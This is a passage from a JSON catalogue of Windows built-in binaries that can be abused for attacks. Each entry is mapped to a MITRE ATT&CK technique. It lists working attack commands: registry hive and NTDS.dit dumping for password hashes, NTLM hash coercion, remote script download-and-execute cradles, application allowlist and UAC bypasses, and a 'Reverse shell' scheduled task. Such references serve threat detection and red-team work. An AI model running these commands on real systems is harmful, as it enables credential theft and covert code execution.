                    "code": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg"
                },
                {
                    "label": "Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material",
                    "code": "reg save HKLM\\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\\SAM {PATH_ABSOLUTE:.3.bak}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Regasm.exe",
            "description": "Part of .NET",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Loads the target .NET DLL file and executes the RegisterClass function.",
                    "code": "regasm.exe {PATH:.dll}"
                },
                {
                    "label": "Loads the target .DLL file and executes the UnRegisterClass function.",
                    "code": "regasm.exe /U {PATH:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1218.009",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.009/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Regedit.exe",
            "description": "Used by Windows to manipulate registry",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Export the target Registry key to the specified .REG file.",
                    "code": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey"
                },
                {
                    "label": "Import the target .REG file into the Registry.",
                    "code": "regedit {PATH_ABSOLUTE}:regfile.reg"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Regini.exe",
            "description": "Used to manipulate the registry",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Write registry keys from data inside the Alternate data stream.",
                    "code": "regini.exe {PATH}:hidden.ini"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Register-cimprovider.exe",
            "description": "Used to register new wmi providers",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Load the target .DLL.",
                    "code": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Regsvcs.exe",
            "description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies",
            "categories": [
                "execute",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Loads the target .NET DLL file and executes the RegisterClass function.",
                    "code": "regsvcs.exe {PATH:.dll}"
                },
                {
                    "label": "Loads the target .NET DLL file and executes the RegisterClass function.",
                    "code": "regsvcs.exe {PATH:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1218.009",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.009/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Regsvr32.exe",
            "description": "Used by Windows to register dlls",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute the specified remote .SCT script with scrobj.dll.",
                    "code": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll"
                },
                {
                    "label": "Execute the specified local .SCT script with scrobj.dll.",
                    "code": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll"
                },
                {
                    "label": "Execute the specified remote .SCT script with scrobj.dll.",
                    "code": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll"
                },
                {
                    "label": "Execute the specified local .SCT script with scrobj.dll.",
                    "code": "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll"
                },
                {
                    "label": "Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.",
                    "code": "regsvr32.exe /s {PATH:.dll}"
                },
                {
                    "label": "Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.",
                    "code": "regsvr32.exe /u /s {PATH:.dll}"
                }
            ],
            "mitre": {
                "technique": "T1218.010",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.010/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Replace.exe",
            "description": "Used to replace file with another file",
            "categories": [
                "copy",
                "download"
            ],
            "commands": [
                {
                    "label": "Copy .cab file to destination",
                    "code": "replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A"
                },
                {
                    "label": "Download/Copy executable to specified folder",
                    "code": "replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Reset.exe",
            "description": "Remote Desktop Services Reset Utility",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Once executed, `reset.exe` will execute `rwinsta.exe` in the same folder. Thus, if `reset.exe` is copied to a folder and an arbitrary executable is renamed to `rwinsta.exe`, `reset.exe` will spawn it.",
                    "code": "reset.exe session"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Rpcping.exe",
            "description": "Used to verify rpc connection",
            "categories": [
                "credentials"
            ],
            "commands": [
                {
                    "label": "Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.",
                    "code": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM"
                },
                {
                    "label": "Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).",
                    "code": "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM"
                }
            ],
            "mitre": {
                "technique": "T1003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Rundll32.exe",
            "description": "Used by Windows to execute dll files",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.",
                    "code": "rundll32.exe {PATH},EntryPoint"
                },
                {
                    "label": "Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.",
                    "code": "rundll32.exe {PATH_SMB:.dll},EntryPoint"
                },
                {
                    "label": "Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.",
                    "code": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")"
                },
                {
                    "label": "Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).",
                    "code": "rundll32 \"{PATH}:ADSDLL.dll\",DllMain"
                },
                {
                    "label": "Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.",
                    "code": "rundll32.exe -sta {CLSID}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Runexehelper.exe",
            "description": "Launcher process",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable.",
                    "code": "runexehelper.exe {PATH_ABSOLUTE:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Runonce.exe",
            "description": "Executes a Run Once Task that has been configured in the registry",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes a Run Once Task that has been configured in the registry.",
                    "code": "Runonce.exe /AlternateShellStartup"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Runscripthelper.exe",
            "description": "Execute target PowerShell script",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute the PowerShell script with .txt extension",
                    "code": "runscripthelper.exe surfacecheck \\\\?\\{PATH_ABSOLUTE:.txt} {PATH_ABSOLUTE:folder}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Sc.exe",
            "description": "Used by Windows to manage services",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Creates a new service and executes the file stored in the ADS.",
                    "code": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice"
                },
                {
                    "label": "Modifies an existing service and executes the file stored in the ADS.",
                    "code": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Schtasks.exe",
            "description": "Schedule periodic tasks",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Create a recurring task to execute every minute.",
                    "code": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\""
                },
                {
                    "label": "Create a scheduled task on a remote computer for persistence/lateral movement",
                    "code": "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily"
                }
            ],
            "mitre": {
                "technique": "T1053.005",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1053.005/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Scriptrunner.exe",
            "description": "Execute binary through proxy binary to evade defensive counter measures",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes executable",
                    "code": "Scriptrunner.exe -appvscript {PATH:.exe}"
                },
                {
                    "label": "Executes cmd file from remote server",
                    "code": "ScriptRunner.exe -appvscript {PATH_SMB:.cmd}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Setres.exe",
            "description": "Configures display settings",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Sets the resolution and then launches 'choice' command from the working directory.",
                    "code": "setres.exe -w 800 -h 600"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "SettingSyncHost.exe",
            "description": "Host Process for Setting Synchronization",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute file specified in %COMSPEC%",
                    "code": "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}"
                },
                {
                    "label": "Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32.",
                    "code": "SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Sftp.exe",
            "description": "sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe.",
                    "code": "sftp -o ProxyCommand=\"{CMD}\" ."
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "ssh.exe",
            "description": "Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.",
                    "code": "ssh localhost \"{CMD}\""
                },
                {
                    "label": "Executes specified command from ssh.exe",
                    "code": "ssh -o ProxyCommand=\"{CMD}\" ."
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Stordiag.exe",
            "description": "Storage diagnostic tool",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.",
                    "code": "stordiag.exe"
                },
                {
                    "label": "Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.",
                    "code": "stordiag.exe"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "SyncAppvPublishingServer.exe",
            "description": "Used by App-v to get App-v server lists",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Example command on how inject Powershell code into the process",
                    "code": "SyncAppvPublishingServer.exe \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\""
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Tar.exe",
            "description": "Used by Windows to extract and create archives.",
            "categories": [
                "execute",
                "copy"
            ],
            "commands": [
                {
                    "label": "Compress one or more files to an alternate data stream (ADS).",
                    "code": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}"
                },
                {
                    "label": "Decompress a compressed file from an alternate data stream (ADS).",
                    "code": "tar -xf {PATH}:ads"
                },
                {
                    "label": "Extracts archive.tar from the remote (internal) host to the current host.",
                    "code": "tar -xf {PATH_SMB:.tar}"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Ttdinject.exe",
            "description": "Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",
                    "code": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\""
                },
                {
                    "label": "Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",
                    "code": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\""
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Tttracer.exe",
            "description": "Used by Windows 1809 and newer to Debug Time Travel",
            "categories": [
                "execute",
                "dump"
            ],
            "commands": [
                {
                    "label": "Execute specified executable from tttracer.exe. Requires administrator privileges.",
                    "code": "tttracer.exe {PATH_ABSOLUTE:.exe}"
                },
                {
                    "label": "Dumps process using tttracer.exe. Requires administrator privileges",
                    "code": "TTTracer.exe -dumpFull -attach {PID}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Unregmp2.exe",
            "description": "Microsoft Windows Media Player Setup Utility",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'.",
                    "code": "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe /HideWMP\""
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "vbc.exe",
            "description": "Binary file used for compile vbs code",
            "categories": [
                "compile"
            ],
            "commands": [
                {
                    "label": "Binary file used by .NET to compile Visual Basic code to an executable.",
                    "code": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}"
                },
                {
                    "label": "Binary file used by .NET to compile Visual Basic code to an executable.",
                    "code": "vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}"
                }
            ],
            "mitre": {
                "technique": "T1127",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1127/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Verclsid.exe",
            "description": "Used to verify a COM object before it is instantiated by Windows Explorer",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Used to verify a COM object before it is instantiated by Windows Explorer",
                    "code": "verclsid.exe /S /C {CLSID}"
                }
            ],
            "mitre": {
                "technique": "T1218.012",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.012/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Wab.exe",
            "description": "Windows address book manager",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice",
                    "code": "wab.exe"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "wbadmin.exe",
            "description": "Windows Backup Administration utility",
            "categories": [
                "dump"
            ],
            "commands": [
                {
                    "label": "Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)",
                    "code": "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet"
                },
                {
                    "label": "Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.",
                    "code": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet"
                }
            ],
            "mitre": {
                "technique": "T1003.003",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1003.003/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "wbemtest.exe",
            "description": "WMI/WBEM Test Binary",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources.",
                    "code": "wbemtest.exe"
                }
            ],
            "mitre": {
                "technique": "T1047",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1047/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "winget.exe",
            "description": "Windows Package Manager tool",
            "categories": [
                "execute",
                "download",
                "awl-bypass"
            ],
            "commands": [
                {
                    "label": "Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`",
                    "code": "winget.exe install --manifest {PATH:.yml}"
                },
                {
                    "label": "Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.",
                    "code": "winget.exe install --accept-package-agreements -s msstore {name or ID}"
                },
                {
                    "label": "Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.",
                    "code": "winget.exe install --accept-package-agreements -s msstore {name or ID}"
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Wlrmdr.exe",
            "description": "Windows Logon Reminder executable",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute executable with wlrmdr.exe as parent process",
                    "code": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Wmic.exe",
            "description": "The WMI command-line (WMIC) utility provides a command-line interface for WMI",
            "categories": [
                "execute",
                "copy"
            ],
            "commands": [
                {
                    "label": "Execute a .EXE file stored as an Alternate Data Stream (ADS)",
                    "code": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\""
                },
                {
                    "label": "Execute calc from wmic",
                    "code": "wmic.exe process call create \"{CMD}\""
                },
                {
                    "label": "Execute evil.exe on the remote system.",
                    "code": "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\""
                },
                {
                    "label": "Create a volume shadow copy of NTDS.dit that can be copied.",
                    "code": "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\""
                },
                {
                    "label": "Executes JScript or VBScript embedded in the target remote XSL stylsheet.",
                    "code": "wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\""
                },
                {
                    "label": "Copy file from source to destination.",
                    "code": "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\""
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "WorkFolders.exe",
            "description": "Work Folders",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute control.exe in the current working directory",
                    "code": "WorkFolders"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Wscript.exe",
            "description": "Used by Windows to execute scripts",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute script stored in an alternate data stream",
                    "code": "wscript //e:vbscript {PATH}:script.vbs"
                },
                {
                    "label": "Download and execute script stored in an alternate data stream",
                    "code": "echo GetObject(\"script:{REMOTEURL:.js}\") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js"
                }
            ],
            "mitre": {
                "technique": "T1564.004",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1564.004/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Wsreset.exe",
            "description": "Used to reset Windows Store settings according to its manifest file",
            "categories": [
                "uac-bypass"
            ],
            "commands": [
                {
                    "label": "During startup, wsreset.exe checks the registry value HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.",
                    "code": "wsreset.exe"
                }
            ],
            "mitre": {
                "technique": "T1548.002",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1548.002/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "wuauclt.exe",
            "description": "Windows Update Client",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Loads and executes DLL code on attach.",
                    "code": "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Xwizard.exe",
            "description": "Execute custom class that has been added to the registry or download a file with Xwizard.exe",
            "categories": [
                "execute",
                "download"
            ],
            "commands": [
                {
                    "label": "Xwizard.exe running a custom class that has been added to the registry.",
                    "code": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}"
                },
                {
                    "label": "Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.",
                    "code": "xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}"
                },
                {
                    "label": "Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.",
                    "code": "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}"
                }
            ],
            "mitre": {
                "technique": "T1218",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "msedge_proxy.exe",
            "description": "Microsoft Edge Browser",
            "categories": [
                "download",
                "execute"
            ],
            "commands": [
                {
                    "label": "msedge_proxy will download malicious file.",
                    "code": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}"
                },
                {
                    "label": "msedge_proxy.exe will execute file in the background",
                    "code": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\""
                }
            ],
            "mitre": {
                "technique": "T1105",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1105/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "msedgewebview2.exe",
            "description": "msedgewebview2.exe is the executable file for Microsoft Edge WebView2, which is a web browser control used by applications to display web content.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess.",
                    "code": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\""
                },
                {
                    "label": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.",
                    "code": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\""
                },
                {
                    "label": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.",
                    "code": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\""
                },
                {
                    "label": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.",
                    "code": "msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=\"{CMD}\""
                }
            ],
            "mitre": {
                "technique": "T1218.015",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.015/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "wt.exe",
            "description": "Windows Terminal",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute a command via Windows Terminal.",
                    "code": "wt.exe {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1202",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1202/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Advpack.dll",
            "description": "Utility for installing software and drivers with rundll32.exe",
            "categories": [
                "awl-bypass",
                "execute"
            ],
            "commands": [
                {
                    "label": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "code": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,"
                },
                {
                    "label": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).",
                    "code": "rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,"
                },
                {
                    "label": "Launch a DLL payload by calling the RegisterOCX function.",
                    "code": "rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}"
                },
                {
                    "label": "Launch an executable by calling the RegisterOCX function.",
                    "code": "rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}"
                },
                {
                    "label": "Launch command line by calling the RegisterOCX function.",
                    "code": "rundll32 advpack.dll, RegisterOCX {CMD}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Desk.cpl",
            "description": "Desktop Settings Control Panel",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "Launch an executable with a .scr extension by calling the InstallScreenSaver function.",
                    "code": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}"
                },
                {
                    "label": "Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.",
                    "code": "rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}"
                }
            ],
            "mitre": {
                "technique": "T1218.011",
                "name": "",
                "url": "https://attack.mitre.org/techniques/T1218.011/"
            },
            "detection": [],
            "references": []
        },
        {
            "name": "Dfshim.dll",
            "description": "ClickOnce engine in Windows used by .NET",
            "categories": [
                "awl-bypass"
            ],
            "commands": [
                {
